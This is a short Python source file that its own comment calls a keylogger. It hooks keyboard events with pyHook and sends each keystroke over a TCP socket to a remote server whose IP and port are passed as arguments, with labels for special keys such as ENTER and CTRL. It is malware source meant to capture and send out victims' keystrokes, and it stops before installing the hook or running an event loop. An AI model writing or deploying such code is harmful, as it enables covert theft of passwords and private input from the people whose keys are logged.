#!/bin/python

# this program is a keylogger that logs and sends the keys to a server wich IP and port as in arguments

import socket
import sys
import time
import os
import pyHook
import pythoncom

# the server IP and port
ip = sys.argv[1]
port = int(sys.argv[2])

# check if the server is up
def check_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False
    
# send the keys to the server
def send_keys(keys):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(keys)
    s.close()

# the keylogger
def OnKeyboardEvent(event):
    special_keys = {
        8: "[BACKSPACE]",
        13: "[ENTER]",
        9: "[TAB]",
        32: " ",
        27: "[ESC]",
        20: "[CAPSLOCK]",
        16: "[SHIFT]",
        17: "[CTRL]",
        18: "[ALT]",
        91: "[WIN]",
        93: "[WIN]",
        145: "[SCROLLLOCK]"
    }
    key = event.Ascii
    if key in special_keys:
        send_keys(special_keys[key])
    else:
        send_keys(chr(key))


